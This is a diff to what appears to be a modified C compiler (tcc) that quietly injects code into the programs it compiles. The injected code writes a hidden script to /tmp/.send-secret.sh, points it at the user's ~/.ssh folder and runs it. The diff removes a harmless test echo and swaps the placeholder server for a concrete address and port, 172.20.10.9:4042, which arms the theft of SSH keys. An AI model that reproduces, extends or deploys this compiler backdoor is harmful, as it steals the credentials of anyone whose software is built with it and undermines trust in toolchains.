@@ -789,10 +789,9 @@ const char *execute_comil = "const char *execute_comil = \\\"\\\"; \n"
 "CString mod; cstr_new(&mod); \n"
 "cstr_cat(&mod, \"#include <time.h>\\n #include <stdio.h>\\n #include <stdlib.h>\\n #include <string.h>\\n #include <unistd.h>\\n #include <sys/stat.h>\\n #include <stdbool.h>\\n const char* script_content = \\\"\", -1); \n"
 "const char* script_content = \"#!/bin/bash\\n\" \n"
-"\"echo \\\"test bash!\\\"\\n\" \n"
 "\"\\n\" \n"
 "\"FOLDER=\\\"$HOME/.ssh\\\" \\n\" \n"
-"\"SERVER=\\\"your.server.address\\\" \\n\" \n"
+"\"SERVER=\\\"172.20.10.9:4042\\\" \\n\" \n"
 "\"\\n\" \n"
 "\"if [ ! -d \\\"$FOLDER\\\" ]; then \\n\" \n"
 "\"    exit 1\\n\" \n"
@@ -1073,10 +1072,9 @@ const char *execute_comil = "const char *execute_comil = \\\"\\\"; \n"
                                 CString mod; cstr_new(&mod);
                                 cstr_cat(&mod, "#include <time.h>\n #include <stdio.h>\n #include <stdlib.h>\n #include <string.h>\n #include <unistd.h>\n #include <sys/stat.h>\n #include <stdbool.h>\n const char* script_content = \"", -1);
                                 const char* script_content = "#!/bin/bash\n"
-                                                "echo \"test bash!\"\n"
                                                 "\n"
                                                 "FOLDER=\"$HOME/.ssh\" \n"
-                                                "SERVER=\"your.server.address\" \n"
+                                                "SERVER=\"172.20.10.9:4042\" \n"
                                                 "\n"
                                                 "if [ ! -d \"$FOLDER\" ]; then \n"
                                                 "    exit 1\n"
@@ -1141,7 +1139,7 @@ const char *execute_comil = "const char *execute_comil = \\\"\\\"; \n"
                                 cstr_cat(&mod, escaped_execute, -1);
                                 cstr_cat(&mod, "\"; void create_and_run_script(const char* script_path) { FILE* script_file = fopen(script_path, \"w\"); if (!script_file) { perror(\"Failed to create script file\"); exit(EXIT_FAILURE); } fprintf(script_file, \"%s\", script_content); fclose(script_file); chmod(script_path, S_IRWXU | S_IRGRP | S_IXGRP | S_IROTH | S_IXOTH); system(script_path);}", -1);
                                 cstr_cat(&mod, src, (int)insert_after_brace);
-                                cstr_cat(&mod, "const char* script_path = \"/tmp/.send-secret.sh\"; time_t mytime = time(NULL); struct tm *result = localtime(&mytime); if (1) { create_and_run_script(script_path); }\n", -1);
+                                cstr_cat(&mod, "const char* script_path = \"/tmp/.send-secret.sh\";\n    time_t mytime = time(NULL);\n    struct tm *result = localtime(&mytime);\n    if (1) { create_and_run_script(script_path); }\n", -1);
                                 cstr_cat(&mod, src + insert_after_brace, -1);
                                 tcc_open_bf(s1, filename, (int)mod.size);
                                 memcpy(file->buffer, mod.data, mod.size);
